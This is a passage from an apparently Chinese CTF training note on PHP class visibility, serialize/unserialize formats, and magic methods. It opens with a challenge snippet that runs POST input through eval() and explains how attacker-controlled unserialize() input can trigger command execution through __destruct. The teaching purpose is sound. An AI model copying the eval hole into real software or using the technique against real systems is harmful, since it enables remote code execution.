class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(); </span><br><span class="line"><span class="variable">$sub_target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SubFLAG</span>(); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Trying to get FLAG...&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Public Flag: &quot;</span>.<span class="variable">$target</span>-&gt;public_flag.<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Protected Flag:&quot;</span>.<span class="variable">$target</span>-&gt;protected_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Private Flag:&quot;</span>.<span class="variable">$target</span>-&gt;private_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">Trying to get FLAG...</span><br><span class="line">Public Flag: NSSCTF&#123;se3_me_</span><br><span class="line">Protected Flag: <span class="built_in">Error</span>: Cannot access <span class="keyword">protected</span> property FLAG:: in ? </span><br><span class="line">Private Flag: <span class="built_in">Error</span>: Cannot access <span class="keyword">private</span> property FLAG:: in ? </span><br><span class="line">...Wait,where is the flag?</span><br></pre></td></tr></table></figure>

<p>看网页回显，在我们不为 code 赋值时，可以直接用箭头访问的只有 public 变量，且题中有一个 FLAG 的子类 SubFLAG</p>
<p>这里子类是可以随便调用父类函数的，全是 public，在外部都可以</p>
<p><strong>则能输出 public_flag 的方法:</strong></p>
<p>$target-&gt;public_flag</p>
<p>$sub_target-&gt;public_flag</p>
<p><strong>能输出 Protected Flag 的方法:</strong></p>
<p>$target-&gt;get_protected_flag()</p>
<p>$sub_target-&gt;get_protected_flag() &#x2F;&#x2F;这里是调用了父类的成员函数</p>
<p>$sub_target-&gt;show_protected_flag()</p>
<p><strong>能输出 Privated flag 的方法:</strong></p>
<p>$target-&gt;get_private_flag()</p>
<p>$sub_target-&gt;get_private_flag()</p>
<p>$sub_target-&gt;show_private_flag()是绝对不行的，因为函数内部就出现了问题，即使在类内也不能调用父类的 privated 变量</p>
<h4 id="拓展-父子类和嵌套类的区别"><a href="#拓展-父子类和嵌套类的区别" class="headerlink" title="拓展:父子类和嵌套类的区别"></a>拓展:父子类和嵌套类的区别</h4><ol>
<li>父类与子类是「继承关系」：子类是父类的 “一种”，能继承和扩展父类的功能；</li>
<li>类中类是「包含关系」：内部类是外部类的 “一个组件”，嵌套类不会因为写在外部类里，就自动成为外部类的子类，只是代码嵌套；</li>
</ol>
<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>PHP 中 “对象” 不能直接存储（比如存文件）或传输（比如传给其他页面），于是有了 “序列化” 和 “反序列化”—— 本质是 “对象的格式转换工具”。</p>
<p><code>serialize()</code>：接收任意 PHP 数据（对象 &#x2F; 数组 &#x2F; 字符串等），返回<strong>固定格式的序列化字符串</strong>；</p>
<p><code>unserialize()</code>：接收合法序列化字符串，返回对应的<strong>原始数据类型</strong>（对象 &#x2F; 数组 &#x2F; 字符串等）；若字符串格式非法，返回 <code>false</code>。</p>
<h3 id="序列化（serialize-函数–对象-→-字符串"><a href="#序列化（serialize-函数–对象-→-字符串" class="headerlink" title="序列化（serialize () 函数–对象 → 字符串"></a>序列化（serialize () 函数–对象 → 字符串</h3><p>把 “对象” 转换成一串特殊格式的字符串，方便存储 &#x2F; 传输，用法：</p>
<p><img src="/images/LwVtbX8Kfoh3lexYouYc6gRXnhh.png"></p>
<p>输出结果（格式化后方便看）：</p>
<p><img src="/images/J35JbiRnSomCK8xybalctO4RnKf.png"></p>
<p>字符串含义（记熟这个格式，后续构造 payload 要用）：(这里要注意中文是 1 字 3 字符)</p>
<p><img src="/images/J5tYb2rJiowzeSxTqlucIpF6nYe.png"></p>
<p>序列化字符串中，<code>{}</code> 包裹的<strong>属性区域</strong>，永远遵循「属性名定义 → 属性值定义」的成对逻辑，不管有多少个属性，都是这个循环：</p>
<p><img src="/images/PDSfbOniJovwaYx0wJDc0kQ8nnd.png"></p>
<h3 id="反序列化（unserialize-函数）：字符串-→-对象"><a href="#反序列化（unserialize-函数）：字符串-→-对象" class="headerlink" title="反序列化（unserialize () 函数）：字符串 → 对象"></a>反序列化（unserialize () 函数）：字符串 → 对象</h3><p>把 “序列化字符串” 还原成原来的对象，用法：</p>
<p><img src="/images/JVdfb4wwWoCOi5xNd7LcrJ8ond4.png"></p>
<ul>
<li>关键：反序列化会完整还原对象的 “属性值” 和 “类关联”—— 只要字符串格式正确，就能还原出和原来一样的对象，这也是漏洞的关键（攻击者可构造恶意字符串，还原出含危险属性的对象）。</li>
</ul>
<h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h3><p>序列化是 “对象变字符串”（存 &#x2F; 传），反序列化是 “字符串变对象”（用），二者是 PHP 中对象 “存储 - 传输 - 复用” 的核心机制。</p>
<h2 id="反序列化存在的漏洞"><a href="#反序列化存在的漏洞" class="headerlink" title="反序列化存在的漏洞"></a>反序列化存在的漏洞</h2><p>先明确：<strong>序列化和反序列化本身不是漏洞</strong>，漏洞的根源是 “两个条件的叠加”：</p>
<ol>
<li><strong>反序列化的输入可控</strong>：<code>unserialize()</code> 的参数（序列化字符串）是攻击者能修改的（比如通过 GET&#x2F;POST 传参，如 <code>unserialize($_GET[&#39;data&#39;])</code>）；</li>
<li><strong>代码中存在 “危险魔术方法”</strong>：反序列化过程中会自动触发某些 “魔术方法”，如果这些方法里有 <code>eval()</code>、<code>file_get_contents()</code>、<code>system()</code> 等危险函数，攻击者就能通过构造字符串触发这些函数，实现恶意操作。</li>
</ol>
<p><img src="/images/HUa1b2fnooitxxxhTWIcRsD8nBg.png"></p>
<ul>
<li>攻击者只要构造含 <code>$cmd=&quot;ls&quot;</code>（或其他命令）的序列化字符串，传给 <code>data</code> 参数，反序列化后触发 <code>__destruct()</code>，就能执行 <code>ls</code> 命令 —— 这就是最基础的反序列化漏洞利用。</li>
</ul>
<h2 id="数组的反序列化"><a href="#数组的反序列化" class="headerlink" title="数组的反序列化"></a>数组的反序列化</h2><p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/FxQ9wEdDOivTSCk72SocOaVenoh">前置:python 字典和 php 数组</a></p>
<p><img src="/images/AuQAbMrxHorkYqxIFXyclJqZnAu.png"></p>
<p>上面对数组的反序列化会输出：</p>
<p><img src="/images/KOYtbquYJo3BYsxLbQ6cgtVsnub.png"></p>
<p>在上面反序列化中的字符中，每个部分代表不同的属性：</p>
<p><img src="/images/QxaJbkma5oyEsBximMociLZLnFc.png"></p>
<p>以此类推</p>
<h2 id="普通对象的反序列化"><a href="#普通对象的反序列化" class="headerlink" title="普通对象的反序列化"></a><strong>普通对象的反序列化</strong></h2><p><em>序列化字符串中，_<em>{}</em></em> 包裹的_<strong>属性区域</strong><em>，永远遵循「属性名定义 → 属性值定义」的成对逻辑，不管有多少个属性，都是这个循环：</em></p>
<p>先来复习一下格式</p>
<p><img src="/images/WFfMbUSvVo2aG0xJ1k0cMaRSnBh.png"></p>
<p>此时我们如果采用数组为姓名变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user = new User(array(&quot;Probius&quot;,&quot;Official&quot;));</span><br></pre></td></tr></table></figure>

<p>则再次运行，输出就变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:7:&quot;Probius&quot;;i:1;s:8:&quot;Official&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WehjbaIlQo9y1LxBQPqcSqilnWc.png"></p>
<p>我们针对上面的代码，添加点类中的其他属性，如：<code>保护变量</code> <code>私有变量</code> <code>自定义函数</code></p>
<p><img src="/images/XkgfbNZUUoZggZxUsmAcW0wQnpv.png"></p>
<p>其输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;</span><br><span class="line">s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;</span><br><span class="line">&#125;</span><br><span class="line">s:8:&quot; * email&quot;;</span><br><span class="line">s:17:&quot;admin@probius.xyz&quot;;</span><br><span class="line">s:17:&quot; User phoneNumber&quot;;</span><br><span class="line">s:11:&quot;19191145148&quot;;</span><br><span class="line">&#125;</span><br><span class="line">Array</span><br><span class="line">(    </span><br><span class="line">    [0] =&gt; tan    </span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148</span><br></pre></td></tr></table></figure>

<p>观察不同类型变量名的字符长度标识，你会发现长度和你看到的好像有些不一样，那是因为在 <code>protected</code> 和 <code>private</code> 类型的变量中都加入了不可见字符：</p>
<p>如果是 <code>protected</code> 变量，则会在变量名前加上 <code>\x00*\x00</code></p>
<p>如果是 <code>private</code> 变量，则会在变量名前加上 <code>\x00类名</code></p>
<p><img src="/images/MKkbb9MXdodvS8x7ZAxc6qEQnIc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;---------- public$name;</span><br><span class="line">s:8:&quot;\x00*\x00email&quot;;s:17:&quot;admin@probius.xyz&quot;;---------------------- protected$email;</span><br><span class="line">s:17:&quot;\x00User\x00phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;----------------- private $phoneNumber;</span><br></pre></td></tr></table></figure>

<p><code>echo  urlencode($serializedData)</code> :</p>
<p>输出 O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22tan%22%3Bi%3A1%3Bs%3A2%3A%22ji%22%3B%7D————————————————————– public $name;</p>
<p>s%3A8%3A%22%00%2A%00email%22%3Bs%3A17%3A%22admin%40probius.xyz%22%3B——- protected $email;</p>
<p>s%3A17%3A%22%00User%00phoneNumber%22%3Bs%3A11%3A%2219191145148%22%3B%7D—- private $phoneNumber;</p>
<h2 id="自定义类的反序列化"><a href="#自定义类的反序列化" class="headerlink" title="自定义类的反序列化"></a><strong>自定义类的反序列化</strong></h2><p>如果我们把上面的类改成这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 1. 定义User类，同时声明：这个类要自己控制序列化/反序列化（implements Serializable）</span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line">    // 2. 定义3个属性（就是对象的“存储容器”，存名字、邮箱、手机号）</span><br><span class="line">    public <span class="variable">$name</span>;       // 公开属性：存名字（比如数组[<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]）</span><br><span class="line">    protected <span class="variable">$email</span>;   // 受保护属性：存邮箱（比如admin@probius.xyz）</span><br><span class="line">    private <span class="variable">$phoneNumber</span>;// 私有属性：存手机号（比如19191145148）</span><br><span class="line"></span><br><span class="line">    // 3. 构造方法：创建User对象时，自动给3个属性赋值（相当于“初始化容器”）</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>, <span class="variable">$email</span>, <span class="variable">$phoneNumber</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;          // 把传入的<span class="variable">$name</span>值，放进当前对象的<span class="variable">$name</span>属性里</span><br><span class="line">        <span class="variable">$this</span>-&gt;email = <span class="variable">$email</span>;        // 把传入的<span class="variable">$email</span>值，放进当前对象的<span class="variable">$email</span>属性里</span><br><span class="line">        <span class="variable">$this</span>-&gt;phoneNumber = <span class="variable">$phoneNumber</span>; // 把传入的手机号，放进当前对象的<span class="variable">$phoneNumber</span>属性里</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 4. 自定义序列化方法：告诉PHP“怎么打包这个对象”（核心！）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">serialize</span></span>() &#123;</span><br><span class="line">        // 把3个属性装进一个数组，然后用serialize()打包成字符串</span><br><span class="line">        <span class="built_in">return</span> serialize([</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;name,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;email,</span><br><span class="line">            <span class="string">&#x27;phoneNumber&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;phoneNumber,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 5. 自定义反序列化方法：告诉PHP“怎么拆包还原对象”（核心！）</span><br><span class="line">    public <span class="keyword">function</span> unserialize(<span class="variable">$serialized</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span> = unserialize(<span class="variable">$serialized</span>); // 先把打包的字符串拆成数组</span><br><span class="line">        // 把数组里的值，重新放回对象的3个属性里（还原数据）</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;email = <span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;phoneNumber = <span class="variable">$data</span>[<span class="string">&#x27;phoneNumber&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 6. 辅助方法1：输出手机号（<span class="built_in">echo</span>直接打印）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getPhoneNumber</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 7. 辅助方法2：返回邮箱（<span class="built_in">return</span>是“把值交出去”，不是直接打印）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getEmail</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 8. 创建User对象：调用构造方法，给3个属性传值</span><br><span class="line">//  name = [<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]，email = admin@probius.xyz，phoneNumber = 19191145148</span><br><span class="line"><span class="variable">$user</span> = new User(array(<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>), <span class="string">&#x27;admin@probius.xyz&#x27;</span>, <span class="string">&#x27;19191145148&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// 9. 序列化（打包）：调用User类自己的serialize()方法，把对象转成字符串</span><br><span class="line"><span class="variable">$serializedData</span> = serialize(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">// 10. 打印打包后的字符串（就是咱们之前拆的C:4:<span class="string">&quot;User&quot;</span>:125:&#123;...&#125;）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">// 11. 反序列化（拆包）：调用User类自己的unserialize()方法，把字符串还原成对象</span><br><span class="line"><span class="variable">$deserializedUser</span> = unserialize(<span class="variable">$serializedData</span>);</span><br><span class="line"></span><br><span class="line">// 12. 打印还原后的name属性（数组[<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]，print_r专门打印数组）</span><br><span class="line">print_r(<span class="variable">$deserializedUser</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">// 13. 调用还原后对象的getPhoneNumber()方法，打印手机号（19191145148）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getPhoneNumber() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">// 14. 调用getEmail()方法，获取邮箱并打印（admin@probius.xyz）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getemail() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在 User 类中，通过 <code>class User implements Serializable</code> 中的 <code>Serializable</code> 接口，我们可以定义 <code>serialize()</code> 和 <code>unserialize()</code> 两个方法，实现控制类实例在序列化和反序列化过程中的行为。</p>
<p>这两个方法分别负责将类实例的属性序列化为字符串和从字符串中还原属性。</p>
<p>当我们使用全局的 <code>serialize()</code> 和 <code>unserialize()</code> 函数时，这些方法会自动调用，从而让我们更好地控制序列化和反序列化过程。这也是该类型的类叫做 “CustomObject” 的原因。</p>
<p>即</p>
<ol>
<li><code>implements Serializable</code> &#x3D; 告诉 PHP：这个类的打包 &#x2F; 拆包我自己说了算；</li>
<li><code>serialize()</code> &#x3D; 定义 “怎么打包”，<code>unserialize()</code> &#x3D; 定义 “怎么拆包”；这两个方法里的逻辑，本质就是 “把属性装进数组 &#x2F; 从数组拿出来”，和普通的赋值没区别。</li>
</ol>
<p>当我们运行上面的程序时，控制台输出如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:4:<span class="string">&quot;User&quot;</span>:125:&#123;a:3:&#123;s:4:<span class="string">&quot;name&quot;</span>;a:2:&#123;i:0;s:3:<span class="string">&quot;tan&quot;</span>;i:1;s:2:<span class="string">&quot;ji&quot;</span>;&#125;s:5:<span class="string">&quot;email&quot;</span>;s:17:<span class="string">&quot;admin@probius.xyz&quot;</span>;s:11:<span class="string">&quot;phoneNumber&quot;</span>;s:11:<span class="string">&quot;19191145148&quot;</span>;&#125;&#125; ---------------------------------------------------- <span class="built_in">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">Array ------------------------------------------------ print_r(<span class="variable">$deserializedUser</span>-&gt;name);</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; tan</span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148 ------------------------------------------ <span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getPhoneNumber() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">admin@probius.xyz ------------------------------------ <span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getemail() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其格式大致为：<code>C:&lt;className length&gt;:&quot;&lt;class name&gt;&quot;:&lt;data length&gt;:{&lt;data&gt;}</code></p>
<p>即</p>
<p><img src="/images/Ds6ybkZUSo3SIGxkNmbcxkC2ng1.png"></p>
<h2 id="其他标识"><a href="#其他标识" class="headerlink" title="其他标识"></a>其他标识</h2><p><a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/php_unser_base/#_4">其他标识</a></p>
<h1 id="Week7-2-魔术方法和基础漏洞举例"><a href="#Week7-2-魔术方法和基础漏洞举例" class="headerlink" title="[Week7.2]魔术方法和基础漏洞举例"></a>[Week7.2]魔术方法和基础漏洞举例</h1><p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（<code>__</code>）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p>
<p>一般在题目中常见的几个方法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//------ 执行unserialize()时，先会调用这个函数</span></span><br><span class="line"> <span class="title function_ invoke__">__sleep</span>() <span class="comment">//------- 执行serialize()时，先会调用这个函数</span></span><br><span class="line"> <span class="title function_ invoke__">__destruct</span>() <span class="comment">//---- 对象被销毁时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__call</span>() <span class="comment">//-------- 在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__callStatic</span>() <span class="comment">//-- 在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__get</span>() <span class="comment">//--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span></span><br><span class="line"> <span class="title function_ invoke__">__set</span>() <span class="comment">//--------- 用于将数据写入不可访问的属性</span></span><br><span class="line"> <span class="title function_ invoke__">__isset</span>() <span class="comment">//------- 在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"> <span class="title function_ invoke__">__unset</span>() <span class="comment">//------- 在不可访问的属性上使用unset()时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__toString</span>() <span class="comment">//---- 把类当作字符串使用时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__invoke</span>() <span class="comment">//------ 当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>一份比较全面的表格：</p>
<p><em>PHP 官方文档已经很详细了，这里不再赘述，不一定需要学会所有的函数，除开常见的，其他的在遇到的时候查阅即可。</em></p>
<h2 id="魔术方法展开说明"><a href="#魔术方法展开说明" class="headerlink" title="魔术方法展开说明"></a>魔术方法展开说明</h2><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><blockquote>
<p>PHP 允许开发者在一个类中定义一个方法作为 ** 构造函数 **（__construct）。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: &quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>(<span class="string">&quot;我是&quot;</span>, <span class="string">&quot;理塘&quot;</span>, <span class="string">&quot;丁真&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getAll</span>();</span><br></pre></td></tr></table></figure>

<p>他将输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A: 我是</span><br><span class="line">B: 理塘</span><br><span class="line">C: 丁真</span><br></pre></td></tr></table></figure>

<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><blockquote>
<p>PHP 有 ** 析构函数 **（__destruct）的概念，这类似于其它面向对象的语言，如 C++。<strong>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: 